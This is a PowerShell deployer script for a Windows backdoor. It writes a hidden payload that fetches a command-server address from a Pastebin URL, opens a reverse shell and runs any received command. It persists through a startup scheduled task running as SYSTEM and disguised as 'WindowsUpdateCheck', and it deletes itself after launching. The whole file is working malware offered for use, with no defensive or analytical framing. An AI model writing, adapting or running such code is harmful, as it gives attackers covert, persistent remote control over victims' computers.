# d.ps1 - 2-Stage Deployer (C:\Program Files\)
$pf="C:\Program Files\"
$task="WindowsUpdateCheck"

# MAIN C2 PAYLOAD (paste minified payload here ↓)
$c2Payload = @'
$pastebinUrl="https://pastebin.com/raw/F4fUrSeS";$i=30;Add-Type -Name W -Namespace Win32 -MemberDefinition ''[DllImport("user32.dll")]public static extern bool ShowWindow(IntPtr,int);'';try{[Win32.W]::ShowWindow((Get-Process -Id $PID).MainWindowHandle,0)}catch{};function Test-Conn($s){$c=New-Object Net.Sockets.TcpClient;$tcp=$c.ConnectAsync($s.Split(''':'')[0],[int]$s.Split(''':'')[1]);return $tcp.Wait(5e3)};function Get-Srv{try{$r=iwr $pastebinUrl -UseBasicParsing -TimeoutSec 10;if($r.StatusCode -eq 200 -and $r.Content.Trim() -match ''^[a-zA-Z0-9.-]+\:[0-9]+$'' ){$r.Content.Trim()}}catch{}};function RevShell($s){$p=$s.Split(''':'');$c=New-Object Net.Sockets.TcpClient($p[0],$p[1]);$st=$c.GetStream();$b=New-Object byte[]4096;$h=[Text.Encoding]::ASCII;$info="PS|$env:COMPUTERNAME|$((gl).Path)|$(Get-Date)";$ib=$h.GetBytes($info+"`n");$st.Write($ib,0,$ib.Length);while($c.Connected -and Test-Conn $s){$rb=$st.Read($b,0,$b.Length);if($rb -eq 0){break};$cmd=$h.GetString($b,0,$rb).Trim();if($cmd -eq ''exit''){break};try{$o=(iex $cmd 2>&1 | Out-String)}catch{$o="Error: $($_.Exception.Message)`n"};$ob=$h.GetBytes($o);$st.Write($ob,0,$ob.Length);$st.Flush()};if($c){$c.Close()}};while($true){$srv=Get-Srv;if($srv){RevShell $srv};Start-Sleep $i}
'@

# 1. Create System.ps1 (Main C2 - NO EXIT!)
$c2Payload | sc "$pf\System.ps1" -Force -Encoding ASCII

# 2. Deploy schtasks (SYSTEM hidden)
schtasks /create /tn $task /tr "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$pf\System.ps1`"" /sc onstart /ru SYSTEM /rl HIGHEST /f

# 3. Run immediately
schtasks /run /tn $task

# 4. Self-destruct + EXIT
ri "$pf\d.ps1" -Force -ErrorAction SilentlyContinue
exit
